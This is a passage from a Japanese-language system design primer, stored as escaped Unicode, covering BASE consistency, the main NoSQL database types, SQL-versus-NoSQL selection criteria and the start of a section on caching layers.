\u3068\u5bfe\u7167\u7684\u306b\u3001BASE\u306f\u4e00\u8cab\u6027\u3088\u308a\u3082\u53ef\u7528\u6027\u3092\u512a\u5148\u3057\u307e\u3059\u3002\n\n* **Basically available** - \u30b7\u30b9\u30c6\u30e0\u306f\u53ef\u7528\u6027\u3092\u4fdd\u8a3c\u3057\u307e\u3059\u3002\n* **Soft state** - \u30b7\u30b9\u30c6\u30e0\u306e\u72b6\u614b\u306f\u5165\u529b\u304c\u306a\u304f\u3066\u3082\u6642\u9593\u7d4c\u904e\u3068\u3068\u3082\u306b\u5909\u5316\u3059\u308b\u53ef\u80fd\u6027\u304c\u3042\u308a\u307e\u3059\u3002\n* **\u7d50\u679c\u6574\u5408\u6027** - \u30b7\u30b9\u30c6\u30e0\u5168\u4f53\u306f\u6642\u9593\u7d4c\u904e\u3068\u3068\u3082\u306b\u305d\u306e\u9593\u306b\u5165\u529b\u304c\u306a\u3044\u3068\u3044\u3046\u524d\u63d0\u306e\u3082\u3068\u3001\u4e00\u8cab\u6027\u304c\u9054\u6210\u3055\u308c\u307e\u3059\u3002\n\n[SQL\u304b\uff1fNoSQL\u304b\uff1f](#sql\u304bnosql\u304b) \u3092\u9078\u629e\u3059\u308b\u306e\u306b\u52a0\u3048\u3066\u3001\u3069\u306e\u30bf\u30a4\u30d7\u306eNoSQL\u304c\u3069\u306e\u4f7f\u7528\u4f8b\u306b\u6700\u3082\u9069\u3059\u308b\u304b\u3092\u7406\u89e3\u3059\u308b\u306e\u306f\u3068\u3066\u3082\u6709\u76ca\u3067\u3059\u3002\u3053\u306e\u30bb\u30af\u30b7\u30e7\u30f3\u3067\u306f **\u30ad\u30fc\u30d0\u30ea\u30e5\u30fc\u30b9\u30c8\u30a2**\u3001 **\u30c9\u30ad\u30e5\u30e1\u30f3\u30c8\u30b9\u30c8\u30a2**\u3001 **\u30ef\u30a4\u30c9\u30ab\u30e9\u30e0\u30b9\u30c8\u30a2**\u3001 \u3068 **\u30b0\u30e9\u30d5\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9** \u306b\u3064\u3044\u3066\u89e6\u308c\u3066\u3044\u304d\u307e\u3059\u3002\n\n#### \u30ad\u30fc\u30d0\u30ea\u30e5\u30fc\u30b9\u30c8\u30a2\n\n> \u6982\u8981: \u30cf\u30c3\u30b7\u30e5\u30c6\u30fc\u30d6\u30eb\n\n\u30ad\u30fc\u30d0\u30ea\u30e5\u30fc\u30b9\u30c8\u30a2\u3067\u306f\u4e00\u822c\u7684\u306bO(1)\u306e\u8aad\u307f\u66f8\u304d\u304c\u3067\u304d\u3001\u305d\u308c\u3089\u306f\u30e1\u30e2\u30ea\u306a\u3044\u3057SSD\u3067\u88cf\u4ed8\u3051\u3089\u308c\u3066\u3044\u307e\u3059\u3002\u30c7\u30fc\u30bf\u30b9\u30c8\u30a2\u306f\u30ad\u30fc\u3092 [\u8f9e\u66f8\u7684\u9806\u5e8f](https:\/\/en.wikipedia.org\/wiki\/Lexicographical_order) \u3067\u4fdd\u6301\u3059\u308b\u3053\u3068\u3067\u30ad\u30fc\u306e\u52b9\u7387\u7684\u306a\u53d6\u5f97\u3092\u53ef\u80fd\u306b\u3057\u3066\u3044\u307e\u3059\u3002\u30ad\u30fc\u30d0\u30ea\u30e5\u30fc\u30b9\u30c8\u30a2\u3067\u306f\u30e1\u30bf\u30c7\u30fc\u30bf\u3092\u5024\u3068\u3068\u3082\u306b\u4fdd\u6301\u3059\u308b\u3053\u3068\u304c\u53ef\u80fd\u3067\u3059\u3002\n\n\u30ad\u30fc\u30d0\u30ea\u30e5\u30fc\u30b9\u30c8\u30a2\u306f\u30cf\u30a4\u30d1\u30d5\u30a9\u30fc\u30de\u30f3\u30b9\u306a\u6319\u52d5\u304c\u53ef\u80fd\u3067\u3001\u5358\u7d14\u306a\u30c7\u30fc\u30bf\u30e2\u30c7\u30eb\u3084\u30a4\u30f3\u30e1\u30e2\u30ea\u30fc\u30ad\u30e3\u30c3\u30b7\u30e5\u30ec\u30a4\u30e4\u30fc\u306a\u3069\u306e\u30c7\u30fc\u30bf\u304c\u6025\u901f\u306b\u5909\u308f\u308b\u5834\u5408\u306a\u3069\u306b\u4f7f\u308f\u308c\u307e\u3059\u3002\u5358\u7d14\u306a\u51e6\u7406\u306e\u307f\u306b\u6a5f\u80fd\u304c\u5236\u9650\u3055\u308c\u3066\u3044\u308b\u306e\u3067\u3001\u8ffd\u52a0\u306e\u51e6\u7406\u6a5f\u80fd\u304c\u5fc5\u8981\u306a\u5834\u5408\u306b\u306f\u305d\u306e\u8907\u96d1\u6027\u306f\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u5c64\u306b\u8f09\u305b\u308b\u3053\u3068\u306b\u306a\u308a\u307e\u3059\u3002\n\n\u30ad\u30fc\u30d0\u30ea\u30e5\u30fc\u30b9\u30c8\u30a2\u306f\u3082\u3063\u3068\u8907\u96d1\u306a\u30c9\u30ad\u30e5\u30e1\u30f3\u30c8\u30b9\u30c8\u30a2\u3084\u3001\u30b0\u30e9\u30d5\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u306a\u3069\u306e\u57fa\u672c\u3067\u3059\u3002\n\n##### \u305d\u306e\u4ed6\u306e\u53c2\u8003\u8cc7\u6599\u3001\u30da\u30fc\u30b8: \u30ad\u30fc\u30d0\u30ea\u30e5\u30fc\u30b9\u30c8\u30a2\n\n* [\u30ad\u30fc\u30d0\u30ea\u30e5\u30fc\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9](https:\/\/en.wikipedia.org\/wiki\/Key-value_database)\n* [\u30ad\u30fc\u30d0\u30ea\u30e5\u30fc\u30b9\u30c8\u30a2\u306e\u6b20\u70b9](http:\/\/stackoverflow.com\/questions\/4056093\/what-are-the-disadvantages-of-using-a-key-value-table-over-nullable-columns-or)\n* [Redis\u30a2\u30fc\u30ad\u30c6\u30af\u30c1\u30e3](http:\/\/qnimate.com\/overview-of-redis-architecture\/)\n* [\u30e1\u30e0\u30ad\u30e3\u30c3\u30b7\u30e5\u30a2\u30fc\u30ad\u30c6\u30af\u30c1\u30e3](https:\/\/www.adayinthelifeof.nl\/2011\/02\/06\/memcache-internals\/)\n\n#### \u30c9\u30ad\u30e5\u30e1\u30f3\u30c8\u30b9\u30c8\u30a2\n\n> \u6982\u8981: \u30c9\u30ad\u30e5\u30e1\u30f3\u30c8\u304c\u30d0\u30ea\u30e5\u30fc\u3068\u3057\u3066\u4fdd\u5b58\u3055\u308c\u305f\u30ad\u30fc\u30d0\u30ea\u30e5\u30fc\u30b9\u30c8\u30a2\n\n\u30c9\u30ad\u30e5\u30e1\u30f3\u30c8\u30b9\u30c8\u30a2\u306f\u30aa\u30d6\u30b8\u30a7\u30af\u30c8\u306b\u95a2\u3059\u308b\u5168\u3066\u306e\u60c5\u5831\u3092\u6301\u3064\u30c9\u30ad\u30e5\u30e1\u30f3\u30c8(XML\u3001 JSON\u3001 binary\u306a\u3069)\u3092\u4e2d\u5fc3\u306b\u636e\u3048\u305f\u30b7\u30b9\u30c6\u30e0\u3067\u3059\u3002\u30c9\u30ad\u30e5\u30e1\u30f3\u30c8\u30b9\u30c8\u30a2\u3067\u306f\u3001\u30c9\u30ad\u30e5\u30e1\u30f3\u30c8\u81ea\u8eab\u306e\u5185\u90e8\u69cb\u9020\u306b\u57fa\u3065\u3044\u305f\u3001API\u3082\u3057\u304f\u306f\u30af\u30a8\u30ea\u8a00\u8a9e\u3092\u63d0\u4f9b\u3057\u307e\u3059\u3002 *\u30e1\u30e2\uff1a\u591a\u304f\u306e\u30ad\u30fc\u30d0\u30ea\u30e5\u30fc\u30b9\u30c8\u30a2\u3067\u306f\u3001\u5024\u306e\u30e1\u30bf\u30c7\u30fc\u30bf\u3092\u6271\u3046\u6a5f\u80fd\u3092\u542b\u3093\u3067\u3044\u307e\u3059\u304c\u3001\u305d\u306e\u3053\u3068\u306b\u3088\u3063\u3066\u4e8c\u3064\u30c9\u30ad\u30e5\u30e1\u30f3\u30c8\u30b9\u30c8\u30a2\u3068\u306e\u5883\u754c\u7dda\u304c\u66d6\u6627\u306b\u306a\u3063\u3066\u3057\u307e\u3063\u3066\u3044\u307e\u3059\u3002*\n\n\u4ee5\u4e0a\u306e\u3053\u3068\u3092\u5b9f\u73fe\u3059\u308b\u305f\u3081\u306b\u3001\u30c9\u30ad\u30e5\u30e1\u30f3\u30c8\u306f\u30b3\u30ec\u30af\u30b7\u30e7\u30f3\u3001\u30bf\u30b0\u3001\u30e1\u30bf\u30c7\u30fc\u30bf\u3084\u30c7\u30a3\u30ec\u30af\u30c8\u30ea\u306a\u3069\u3068\u3057\u3066\u6574\u7406\u3055\u308c\u3066\u3044\u307e\u3059\u3002\u30c9\u30ad\u30e5\u30e1\u30f3\u30c8\u540c\u58eb\u306f\u307e\u3068\u3081\u3066\u30b0\u30eb\u30fc\u30d7\u306b\u3067\u304d\u308b\u3082\u306e\u306e\u3001\u305d\u308c\u305e\u308c\u3067\u5168\u304f\u7570\u306a\u308b\u30d5\u30a3\u30fc\u30eb\u30c9\u3092\u6301\u3064\u53ef\u80fd\u6027\u304c\u3042\u308a\u307e\u3059\u3002\n\n[MongoDB](https:\/\/www.mongodb.com\/mongodb-architecture) \u3084 [CouchDB](https:\/\/blog.couchdb.org\/2016\/08\/01\/couchdb-2-0-architecture\/) \u306a\u3069\u306e\u30c9\u30ad\u30e5\u30e1\u30f3\u30c8\u30b9\u30c8\u30a2\u3082\u3001\u8907\u96d1\u306a\u30af\u30a8\u30ea\u3092\u51e6\u7406\u3059\u308b\u305f\u3081\u306eSQL\u306e\u3088\u3046\u306a\u8a00\u8a9e\u3092\u63d0\u4f9b\u3057\u3066\u3044\u307e\u3059\u3002[DynamoDB](http:\/\/www.read.seas.harvard.edu\/~kohler\/class\/cs239-w08\/decandia07dynamo.pdf) \u306f\u30ad\u30fc\u30d0\u30ea\u30e5\u30fc\u3068\u30c9\u30ad\u30e5\u30e1\u30f3\u30c8\u306e\u4e21\u65b9\u3092\u30b5\u30dd\u30fc\u30c8\u3057\u3066\u3044\u307e\u3059\u3002\n\n\u30c9\u30ad\u30e5\u30e1\u30f3\u30c8\u30b9\u30c8\u30a2\u306f\u9ad8\u3044\u67d4\u8edf\u6027\u3092\u62c5\u4fdd\u3059\u308b\u306e\u3067\u3001\u983b\u7e41\u306b\u5909\u5316\u3059\u308b\u30c7\u30fc\u30bf\u3092\u6271\u3046\u6642\u306b\u7528\u3044\u3089\u308c\u307e\u3059\u3002\n\n##### \u305d\u306e\u4ed6\u306e\u53c2\u8003\u8cc7\u6599\u3001\u30da\u30fc\u30b8:  \u30c9\u30ad\u30e5\u30e1\u30f3\u30c8\u30b9\u30c8\u30a2\n\n* [\u30c9\u30ad\u30e5\u30e1\u30f3\u30c8\u6307\u5411 \u30c7\u30fc\u30bf\u30d9\u30fc\u30b9](https:\/\/en.wikipedia.org\/wiki\/Document-oriented_database)\n* [MongoDB \u30a2\u30fc\u30ad\u30c6\u30af\u30c1\u30e3](https:\/\/www.mongodb.com\/mongodb-architecture)\n* [CouchDB \u30a2\u30fc\u30ad\u30c6\u30af\u30c1\u30e3](https:\/\/blog.couchdb.org\/2016\/08\/01\/couchdb-2-0-architecture\/)\n* [Elasticsearch \u30a2\u30fc\u30ad\u30c6\u30af\u30c1\u30e3](https:\/\/www.elastic.co\/blog\/found-elasticsearch-from-the-bottom-up)\n\n#### \u30ef\u30a4\u30c9\u30ab\u30e9\u30e0\u30b9\u30c8\u30a2\n\n<p align=\"center\">\n  <img src=\"http:\/\/i.imgur.com\/n16iOGk.png\"\/>\n  <br\/>\n  <i><a href=http:\/\/blog.grio.com\/2015\/11\/sql-nosql-a-brief-history.html>Source: SQL & NoSQL, a brief history<\/a><\/i>\n<\/p>\n\n> \u6982\u8981: \u30cd\u30b9\u30c8\u3055\u308c\u305f\u30de\u30c3\u30d7 `\u30ab\u30e9\u30e0\u30d5\u30a1\u30df\u30ea\u30fc<\u884c\u30ad\u30fc\u3001 \u30ab\u30e9\u30e0<ColKey\u3001 Value\u3001 Timestamp>>`\n\n\u30ef\u30a4\u30c9\u30ab\u30e9\u30e0\u30b9\u30c8\u30a2\u306e\u30c7\u30fc\u30bf\u306e\u57fa\u672c\u5358\u4f4d\u306f\u30ab\u30e9\u30e0\uff08\u30cd\u30fc\u30e0\u30fb\u30d0\u30ea\u30e5\u30fc\u306e\u30da\u30a2\uff09\u3067\u3059\u3002\u305d\u308c\u305e\u308c\u306e\u30ab\u30e9\u30e0\u306f\u30ab\u30e9\u30e0\u30d5\u30a1\u30df\u30ea\u30fc\u3068\u3057\u3066\uff08SQL\u30c6\u30fc\u30d6\u30eb\u306e\u3088\u3046\u306b\uff09\u30b0\u30eb\u30fc\u30d7\u5316\u3059\u308b\u3053\u3068\u304c\u3067\u304d\u307e\u3059\u3002\u30b9\u30fc\u30d1\u30fc\u30ab\u30e9\u30e0\u30d5\u30a1\u30df\u30ea\u30fc\u306f\u30ab\u30e9\u30e0\u30d5\u30a1\u30df\u30ea\u30fc\u306e\u96c6\u5408\u3067\u3059\u3002\u305d\u308c\u305e\u308c\u306e\u30ab\u30e9\u30e0\u306b\u306f\u884c\u30ad\u30fc\u3067\u30a2\u30af\u30bb\u30b9\u3059\u308b\u3053\u3068\u304c\u3067\u304d\u307e\u3059\u3002\u540c\u3058\u884c\u30ad\u30fc\u3092\u6301\u3064\u30ab\u30e9\u30e0\u306f\u540c\u3058\u884c\u3068\u3057\u3066\u8a8d\u8b58\u3055\u308c\u307e\u3059\u3002\u305d\u308c\u305e\u308c\u306e\u5024\u306f\u3001\u30d0\u30fc\u30b8\u30e7\u30f3\u7ba1\u7406\u3068\u30b3\u30f3\u30d5\u30ea\u30af\u30c8\u304c\u8d77\u304d\u305f\u6642\u306e\u305f\u3081\u306b\u3001\u30bf\u30a4\u30e0\u30b9\u30bf\u30f3\u30d7\u3092\u542b\u307f\u307e\u3059\u3002\n\nGoogle\u306f[Bigtable](http:\/\/www.read.seas.harvard.edu\/~kohler\/class\/cs239-w08\/chang06bigtable.pdf)\u3092\u521d\u306e\u30ef\u30a4\u30c9\u30ab\u30e9\u30e0\u30b9\u30c8\u30a2\u3068\u3057\u3066\u767a\u8868\u3057\u307e\u3057\u305f\u3002\u305d\u308c\u304c\u30aa\u30fc\u30d7\u30f3\u30bd\u30fc\u30b9\u3067Hadoop\u306a\u3069\u3067\u3088\u304f\u4f7f\u308f\u308c\u308b[HBase](https:\/\/www.mapr.com\/blog\/in-depth-look-hbase-architecture) \u3084Facebook\u306b\u3088\u308b[Cassandra](http:\/\/docs.datastax.com\/en\/archived\/cassandra\/2.0\/cassandra\/architecture\/architectureIntro_c.html) \u306a\u3069\u306e\u30d7\u30ed\u30b8\u30a7\u30af\u30c8\u306b\u5f71\u97ff\u3092\u4e0e\u3048\u307e\u3057\u305f\u3002BigTable\u3001HBase\u3084Cassandra\u306a\u3069\u306e\u30b9\u30c8\u30a2\u306f\u30ad\u30fc\u3092\u8f9e\u66f8\u5f62\u5f0f\u3067\u4fdd\u6301\u3059\u308b\u3053\u3068\u3067\u9078\u629e\u3057\u305f\u30ad\u30fc\u30ec\u30f3\u30b8\u3067\u306e\u30c7\u30fc\u30bf\u53d6\u5f97\u3092\u52b9\u7387\u7684\u306b\u3057\u307e\u3059\u3002\n\n\u30ef\u30a4\u30c9\u30ab\u30e9\u30e0\u30b9\u30c8\u30a2\u306f\u9ad8\u3044\u53ef\u7528\u6027\u3068\u30b9\u30b1\u30fc\u30e9\u30d3\u30ea\u30c6\u30a3\u3092\u62c5\u4fdd\u3057\u307e\u3059\u3002\u3053\u308c\u3089\u306f\u3068\u3066\u3082\u5927\u898f\u6a21\u306a\u30c7\u30fc\u30bf\u30bb\u30c3\u30c8\u3092\u6271\u3046\u3053\u3068\u306b\u3088\u304f\u4f7f\u308f\u308c\u307e\u3059\u3002\n\n##### \u305d\u306e\u4ed6\u306e\u53c2\u8003\u8cc7\u6599\u3001\u30da\u30fc\u30b8:  \u30ef\u30a4\u30c9\u30ab\u30e9\u30e0\u30b9\u30c8\u30a2\n\n* [SQL & NoSQL\u7c21\u5358\u306b\u6b74\u53f2\u3092\u3055\u3089\u3046](http:\/\/blog.grio.com\/2015\/11\/sql-nosql-a-brief-history.html)\n* [Bigtable \u30a2\u30fc\u30ad\u30c6\u30af\u30c1\u30e3](http:\/\/www.read.seas.harvard.edu\/~kohler\/class\/cs239-w08\/chang06bigtable.pdf)\n* [HBase \u30a2\u30fc\u30ad\u30c6\u30af\u30c1\u30e3](https:\/\/www.mapr.com\/blog\/in-depth-look-hbase-architecture)\n* [Cassandra \u30a2\u30fc\u30ad\u30c6\u30af\u30c1\u30e3](http:\/\/docs.datastax.com\/en\/archived\/cassandra\/2.0\/cassandra\/architecture\/architectureIntro_c.html)\n\n#### \u30b0\u30e9\u30d5\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\n\n<p align=\"center\">\n  <img src=\"http:\/\/i.imgur.com\/fNcl65g.png\"\/>\n  <br\/>\n  <i><a href=https:\/\/en.wikipedia.org\/wiki\/File:GraphDatabase_PropertyGraph.png>Source: Graph database<\/a><\/i>\n<\/p>\n\n> \u6982\u8981: \u30b0\u30e9\u30d5\n\n\u30b0\u30e9\u30d5\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u3067\u306f\u3001\u305d\u308c\u305e\u308c\u306e\u30ce\u30fc\u30c9\u304c\u30ec\u30b3\u30fc\u30c9\u3067\u3001\u305d\u308c\u305e\u308c\u306e\u30a2\u30fc\u30af\u306f\u4e8c\u3064\u306e\u30ce\u30fc\u30c9\u3092\u7e4b\u3050\u95a2\u4fc2\u6027\u3068\u3057\u3066\u5b9a\u7fa9\u3055\u308c\u307e\u3059\u3002\u30b0\u30e9\u30d5\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u306f\u591a\u6570\u306e\u5916\u90e8\u30ad\u30fc\u3084\u591a\u5bfe\u591a\u306a\u3069\u306e\u8907\u96d1\u306a\u95a2\u4fc2\u6027\u3092\u8868\u3059\u306e\u306b\u6700\u9069\u3067\u3059\u3002\n\n\u30b0\u30e9\u30d5\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u306fSNS\u306a\u3069\u306e\u30b5\u30fc\u30d3\u30b9\u306e\u8907\u96d1\u306a\u95a2\u4fc2\u6027\u30e2\u30c7\u30eb\u306a\u3069\u306b\u3064\u3044\u3066\u9ad8\u3044\u30d1\u30d5\u30a9\u30fc\u30de\u30f3\u30b9\u3092\u767a\u63ee\u3057\u307e\u3059\u3002\u6bd4\u8f03\u7684\u65b0\u3057\u304f\u3001\u307e\u3060\u4e00\u822c\u7684\u306b\u306f\u7528\u3044\u3089\u308c\u3066\u3044\u306a\u3044\u306e\u3067\u3001\u958b\u767a\u30c4\u30fc\u30eb\u3084\u30ea\u30bd\u30fc\u30b9\u3092\u63a2\u3059\u306e\u304c\u4ed6\u306e\u65b9\u6cd5\u306b\u6bd4\u3079\u3066\u96e3\u3057\u3044\u304b\u3082\u3057\u308c\u307e\u305b\u3093\u3002\u591a\u304f\u306e\u30b0\u30e9\u30d5\u306f[REST APIs](#representational-state-transfer-rest)\u3092\u901a\u3058\u3066\u306e\u307f\u30a2\u30af\u30bb\u30b9\u3067\u304d\u307e\u3059\u3002\n\n##### \u305d\u306e\u4ed6\u306e\u53c2\u8003\u8cc7\u6599\u3001\u30da\u30fc\u30b8:  \u30b0\u30e9\u30d5\n\n* [Graph\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9](https:\/\/en.wikipedia.org\/wiki\/Graph_database)\n* [Neo4j](https:\/\/neo4j.com\/)\n* [FlockDB](https:\/\/blog.twitter.com\/2010\/introducing-flockdb)\n\n#### \u305d\u306e\u4ed6\u306e\u53c2\u8003\u8cc7\u6599\u3001\u30da\u30fc\u30b8:  NoSQL\n\n* [\u57fa\u672c\u7528\u8a9e\u306e\u8aac\u660e](http:\/\/stackoverflow.com\/questions\/3342497\/explanation-of-base-terminology)\n* [NoSQL\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u306b\u3064\u3044\u3066\u8abf\u67fb\u3068\u9078\u629e\u30ac\u30a4\u30c9](https:\/\/medium.com\/baqend-blog\/nosql-databases-a-survey-and-decision-guidance-ea7823a822d#.wskogqenq)\n* [\u30b9\u30b1\u30fc\u30e9\u30d3\u30ea\u30c6\u30a3](http:\/\/www.lecloud.net\/post\/7994751381\/scalability-for-dummies-part-2-database)\n* [NoSQL\u306e\u30a4\u30f3\u30c8\u30ed\u30c0\u30af\u30b7\u30e7\u30f3](https:\/\/www.youtube.com\/watch?v=qI_g07C_Q5I)\n* [NoSQL\u30d1\u30bf\u30fc\u30f3](http:\/\/horicky.blogspot.com\/2009\/11\/nosql-patterns.html)\n\n### SQL\u304b\uff1fNoSQL\u304b\uff1f\n\n<p align=\"center\">\n  <img src=\"http:\/\/i.imgur.com\/wXGqG5f.png\"\/>\n  <br\/>\n  <i><a href=https:\/\/www.infoq.com\/articles\/Transition-RDBMS-NoSQL\/>Source: Transitioning from RDBMS to NoSQL<\/a><\/i>\n<\/p>\n\n**SQL** \u3092\u9078\u3076\u7406\u7531:\n\n* \u69cb\u9020\u5316\u3055\u308c\u305f\u30c7\u30fc\u30bf\n* \u53b3\u683c\u306a\u30b9\u30ad\u30fc\u30de\n* \u30ea\u30ec\u30fc\u30b7\u30e7\u30ca\u30eb\u30c7\u30fc\u30bf\n* \u8907\u96d1\u306a\u30b8\u30e7\u30a4\u30f3\u3092\u3059\u308b\u5fc5\u8981\u6027\n* \u30c8\u30e9\u30f3\u30b6\u30af\u30b7\u30e7\u30f3\n* \u30b9\u30b1\u30fc\u30eb\u3059\u308b\u969b\u306e\u30d1\u30bf\u30fc\u30f3\u304c\u660e\u78ba\u306a\u3068\u304d\n* \u958b\u767a\u8005\u306e\u6570\u3001\u30b3\u30df\u30e5\u30cb\u30c6\u30a3\u3001\u30b3\u30fc\u30c9\u7b49\u304c\u3088\u308a\u5145\u5b9f\u3057\u3066\u3044\u308b\n* \u30a4\u30f3\u30c7\u30c3\u30af\u30b9\u306b\u3088\u308b\u30c7\u30fc\u30bf\u63a2\u7d22\u306f\u3068\u3066\u3082\u901f\u3044\n\n**NoSQL** \u3092\u9078\u3076\u7406\u7531:\n\n* \u6e96\u69cb\u9020\u5316\u3055\u308c\u305f\u30c7\u30fc\u30bf\n* \u30c0\u30a4\u30ca\u30df\u30c3\u30af\u306a\u3044\u3057\u3001\u30d5\u30ec\u30ad\u30b7\u30d6\u30eb\u306a\u30b9\u30ad\u30fc\u30de\n* \u30ce\u30f3\u30ea\u30ec\u30fc\u30b7\u30e7\u30ca\u30eb\u306a\u30c7\u30fc\u30bf\n* \u8907\u96d1\u306a\u30b8\u30e7\u30a4\u30f3\u3092\u3059\u308b\u5fc5\u8981\u304c\u306a\u3044\n* \u30c7\u30fc\u30bf\u306e\u591a\u304f\u306eTB (\u3082\u3057\u304f\u306f PB) \u3092\u4fdd\u5b58\u3059\u308b\n* \u96c6\u4e2d\u7684\u3001\u5927\u898f\u6a21\u306a\u30c7\u30fc\u30bf\u8ca0\u8377\u306b\u8010\u3048\u3089\u308c\u308b\n* IOPS\u306b\u3064\u3044\u3066\u306f\u6975\u3081\u3066\u9ad8\u3044\u30b9\u30eb\u30fc\u30d7\u30c3\u30c8\u3092\u793a\u3059\n\nNoSQL\u306b\u9069\u3059\u308b\u30b5\u30f3\u30d7\u30eb\u30c7\u30fc\u30bf:\n\n* \u6025\u6fc0\u306a\u30af\u30ea\u30c3\u30af\u30b9\u30c8\u30ea\u30fc\u30e0\u3084\u30ed\u30b0\u30c7\u30fc\u30bf\u306e\u53ce\u96c6\n* \u30ea\u30fc\u30c0\u30fc\u30dc\u30fc\u30c9\u3084\u30b9\u30b3\u30a2\u30ea\u30f3\u30b0\u30c7\u30fc\u30bf\n* \u30b7\u30e7\u30c3\u30d4\u30f3\u30b0\u30ab\u30fc\u30c8\u306a\u3069\u306e\u4e00\u6642\u7684\u60c5\u5831\n* \u983b\u7e41\u306b\u30a2\u30af\u30bb\u30b9\u3055\u308c\u308b ('\u30db\u30c3\u30c8\u306a') \u30c6\u30fc\u30d6\u30eb\n* \u30e1\u30bf\u30c7\u30fc\u30bf\u3084\u30eb\u30c3\u30af\u30a2\u30c3\u30d7\u30c6\u30fc\u30d6\u30eb\n\n##### \u305d\u306e\u4ed6\u306e\u53c2\u8003\u8cc7\u6599\u3001\u30da\u30fc\u30b8:  \u3000SQL\u3082\u3057\u304f\u306fNoSQL\n\n* [\u6700\u521d\u306e1000\u4e07\u30e6\u30fc\u30b6\u30fc\u306b\u30b9\u30b1\u30fc\u30eb\u30a2\u30c3\u30d7\u3059\u308b\u305f\u3081\u306b](https:\/\/www.youtube.com\/watch?v=w95murBkYmU)\n* [SQL\u3068NoSQL\u306e\u9055\u3044](https:\/\/www.sitepoint.com\/sql-vs-nosql-differences\/)\n\n## \u30ad\u30e3\u30c3\u30b7\u30e5\n\n<p align=\"center\">\n  <img src=\"http:\/\/i.imgur.com\/Q6z24La.png\"\/>\n  <br\/>\n  <i><a href=http:\/\/horicky.blogspot.com\/2010\/10\/scalable-system-design-patterns.html>Source: Scalable system design patterns<\/a><\/i>\n<\/p>\n\n\u30ad\u30e3\u30c3\u30b7\u30e5\u306f\u30da\u30fc\u30b8\u306e\u8aad\u307f\u8fbc\u307f\u6642\u9593\u3092\u524a\u6e1b\u3057\u3001\u30b5\u30fc\u30d0\u30fc\u3084\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u3078\u306e\u8ca0\u8377\u3092\u4f4e\u6e1b\u3059\u308b\u3053\u3068\u304c\u3067\u304d\u307e\u3059\u3002\u3053\u306e\u30e2\u30c7\u30eb\u3067\u306f\u3001\u5b9f\u969b\u306e\u51e6\u7406\u3092\u4fdd\u5b58\u3059\u308b\u305f\u3081\u306b\u3001\u30c7\u30a3\u30b9\u30d1\u30c3\u30c1\u30e3\u30fc\u304c\u307e\u305a\u4ee5\u524d\u306b\u30ea\u30af\u30a8\u30b9\u30c8\u304c\u9001\u4fe1\u3055\u308c\u305f\u304b\u3069\u3046\u304b\u3092\u78ba\u8a8d\u3057\u3001\u76f4\u524d\u306e\u7d50\u679c\u3092\u53d7\u3051\u53d6\u308a\u307e\u3059\u3002\n\n\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u306f\u305d\u306e\u30d1\u30fc\u30c6\u30a3\u30b7\u30e7\u30f3\u306b\u6e21\u3063\u3066\u7d71\u5408\u3055\u308c\u305f\u8aad\u307f\u53d6\u308a\u66f8\u304d\u8fbc\u307f\u306e\u5206\u914d\u3092\u8981\u6c42\u3057\u307e\u3059\u304c\u3001\u4eba\u6c17\u30a2\u30a4\u30c6\u30e0\u306f\u305d\u306e\u5206\u914d\u3092\u6b6a\u3081\u3066\u30b7\u30b9\u30c6\u30e0\u5168\u4f53\u306e\u30dc\u30c8\u30eb\u30cd\u30c3\u30af\u306b\u306a\u3063\u3066\u3057\u307e\u3046\u3053\u3068\u304c\u3042\u308a\u307e\u3059\u3002\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u306e\u524d\u306b\u30ad\u30e3\u30c3\u30b7\u30e5\u3092\u5dee\u3057\u8fbc\u3080\u3053\u3068\u3067\u3053\u306e\u3088\u3046\u306b\u3001\u5747\u4e00\u3067\u306a\u3044\u8ca0\u8377\u3084\u30c8\u30e9\u30d5\u30a3\u30c3\u30af\u306e\u6025\u6fc0\u306a\u5897\u52a0\u3092\u5438\u53ce\u3059\u308b\u3053\u3068\u304c\u3067\u304d\u307e\u3059\u3002\n\n### \u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u30ad\u30e3\u30c3\u30b7\u30f3\u30b0\n\n\u30ad\u30e3\u30c3\u30b7\u30e5\u306fOS\u3084\u30d6\u30e9\u30a6\u30b6\u30fc\u306a\u3069\u306e\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u30b5\u30a4\u30c9\u3001[\u30b5\u30fc\u30d0\u30fc\u30b5\u30a4\u30c9](#\u30ea\u30d0\u30fc\u30b9\u30d7\u30ed\u30ad\u30b7web\u30b5\u30fc\u30d0\u30fc) \u3082\u3057\u304f\u306f\u72ec\u7acb\u306e\u30ad\u30e3\u30c3\u30b7\u30e5\u30ec\u30a4\u30e4\u30fc\u306b\u8a2d\u7f6e\u3059\u308b\u3053\u3068\u304c\u3067\u304d\u307e\u3059\u3002\n\n### CDN\u30ad\u30e3\u30c3\u30b7\u30f3\u30b0\n\n[CDN](#\u30b3\u30f3\u30c6\u30f3\u30c4\u30c7\u30ea\u30d0\u30ea\u30fc\u30cd\u30c3\u30c8\u30ef\u30fc\u30afcontent-delivery-network) \u3082\u30ad\u30e3\u30c3\u30b7\u30e5\u306e\u4e00\u3064\u3068\u3057\u3066\u8003\u3048\u308b\u3053\u3068\u304c\u3067\u304d\u307e\u3059\u3002\n\n### Web\u30b5\u30fc\u30d0\u30fc\u30ad\u30e3\u30c3\u30b7\u30f3\u30b0\n\n[\u30ea\u30d0\u30fc\u30b9\u30d7\u30ed\u30ad\u30b7](#\u30ea\u30d0\u30fc\u30b9\u30d7\u30ed\u30ad\u30b7web\u30b5\u30fc\u30d0\u30fc) \u3084 [Varnish](https:\/\/www.varnish-cache.org\/) \u306a\u3069\u306e\u30ad\u30e3\u30c3\u30b7\u30e5\u306f\u9759\u7684\u305d\u3057\u3066\u52d5\u7684\u306a\u30b3\u30f3\u30c6\u30f3\u30c4\u3092\u76f4\u63a5\u914d\u4fe1\u3059\u308b\u3053\u3068\u304c\u3067\u304d\u307e\u3059\u3002 